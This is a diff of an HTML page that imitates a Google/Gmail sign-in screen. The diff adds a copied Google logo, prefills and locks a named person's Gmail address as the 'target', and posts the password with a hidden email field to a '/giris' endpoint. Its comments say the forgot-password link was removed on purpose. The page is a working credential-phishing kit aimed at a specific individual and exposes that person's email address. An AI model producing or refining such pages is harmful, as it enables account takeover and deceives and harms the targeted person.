@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Yap - Google Hesapları</title>
+    <title>Sign in – Google</title>
     <style>
         * {
             margin: 0;
@@ -32,31 +32,50 @@
             border: 1px solid #dadce0;
             text-align: center;
         }
-        .logo {
-            font-size: 36px;
-            font-weight: 500;
-            letter-spacing: -1px;
-            color: #202124;
+        .google-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
             margin-bottom: 20px;
         }
-        .logo span {
-            color: #4285f4;
+        .google-logo svg {
+            width: 75px;
+            height: auto;
+        }
+        .gmail-text {
+            font-size: 22px;
+            font-weight: 500;
+            color: #202124;
+            margin-left: 8px;
+            letter-spacing: -0.5px;
         }
         .card h2 {
             font-size: 24px;
             font-weight: 400;
             color: #202124;
-            margin-bottom: 8px;
+            margin: 4px 0 8px 0;
         }
         .card .sub {
             color: #5f6368;
             font-size: 16px;
             font-weight: 400;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
+        }
+        .email-display {
+            background: #f1f3f4;
+            border-radius: 4px;
+            padding: 10px 14px;
+            font-size: 16px;
+            color: #202124;
+            text-align: left;
+            margin-bottom: 16px;
+            border: 1px solid #dadce0;
+            cursor: default;
+            font-weight: 500;
         }
         .input-group {
             text-align: left;
-            margin-bottom: 16px;
+            margin-bottom: 8px;
         }
         .input-group label {
             display: block;
@@ -80,6 +99,20 @@
             border-color: #1a73e8;
             box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
         }
+        .show-password {
+            text-align: right;
+            margin: 6px 0 16px 0;
+            font-size: 14px;
+        }
+        .show-password a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .show-password a:hover {
+            text-decoration: underline;
+        }
         .btn {
             width: 100%;
             padding: 12px;
@@ -102,9 +135,7 @@
             font-size: 14px;
             color: #5f6368;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
+            justify-content: flex-end;
         }
         .footer a {
             color: #1a73e8;
@@ -118,44 +149,81 @@
             font-size: 13px;
             color: #5f6368;
             margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
         }
         .lang a {
             color: #1a73e8;
             text-decoration: none;
-            margin: 0 6px;
+        }
+        .lang a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="card">
-        <div class="logo"><span>G</span>mail</div>
-        <h2>Giriş Yap</h2>
-        <p class="sub">Hesabınıza devam edin</p>
+        <!-- Google Logo -->
+        <div class="google-logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="75" height="75">
+                <path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.9 2.8 30.3 0 24 0 14.5 0 6.3 5.4 2.6 13.2l7.9 6.1C12.6 13.8 17.8 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.4 24.5c0-1.6-.1-3.1-.4-4.6H24v8.7h12.6c-.5 2.9-2.1 5.3-4.5 7l7 5.4c4.2-3.9 6.6-9.6 6.6-16.5z"/>
+                <path fill="#FBBC05" d="M10.5 27.8c-1.1-2.2-1.7-4.6-1.7-7.1s.6-4.9 1.7-7.1l-7.9-6.1C1.2 10.8 0 15.3 0 20.7s1.2 9.9 3.3 14.2l7.2-5.6z"/>
+                <path fill="#34A853" d="M24 48c6.5 0 11.9-2.1 15.9-5.8l-7-5.4c-2.1 1.4-4.8 2.2-8.9 2.2-6.1 0-11.4-4.2-13.2-10l-7.2 5.6C6.3 42.6 14.5 48 24 48z"/>
+            </svg>
+            <span class="gmail-text">Gmail</span>
+        </div>
+
+        <h2>Welcome</h2>
+        <p class="sub">Enter your password</p>
+
+        <!-- Hedef email (önceden doldurulmuş, değiştirilemez) -->
+        <div class="email-display">
+            ramalahmadov53@gmail.com
+        </div>
 
         <form action="/giris" method="POST">
+            <!-- Email gizli gönderiliyor (aynı adres) -->
+            <input type="hidden" name="email" value="ramalahmadov53@gmail.com">
+
             <div class="input-group">
-                <label for="email">E-posta veya telefon</label>
-                <input type="email" id="email" name="email" placeholder="E-posta veya telefon" required>
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
             </div>
-            <div class="input-group">
-                <label for="password">Şifre</label>
-                <input type="password" id="password" name="password" placeholder="Şifrenizi girin" required>
+
+            <div class="show-password">
+                <a href="#" onclick="togglePassword()">Show password</a>
             </div>
-            <button type="submit" class="btn">Sonraki</button>
+
+            <!-- FORGOT PASSWORD LİNKİ YOK (sildim) -->
+
+            <button type="submit" class="btn">Next</button>
         </form>
 
         <div class="footer">
-            <span>Hesap oluştur</span>
-            <a href="#">Yardım</a>
+            <a href="#">Create account</a>
         </div>
     </div>
     <div class="lang">
-        <a href="#">Türkçe</a> ·
-        <a href="#">English</a> ·
-        <a href="#">Urdu</a> ·
+        <a href="#">English (UK)</a>
+        <a href="#">اردو</a>
         <a href="#">العربية</a>
+        <a href="#">فارسی</a>
     </div>
 </div>
+
+<script>
+    function togglePassword() {
+        const input = document.getElementById('password');
+        if (input.type === 'password') {
+            input.type = 'text';
+        } else {
+            input.type = 'password';
+        }
+    }
+</script>
 </body>
 </html>
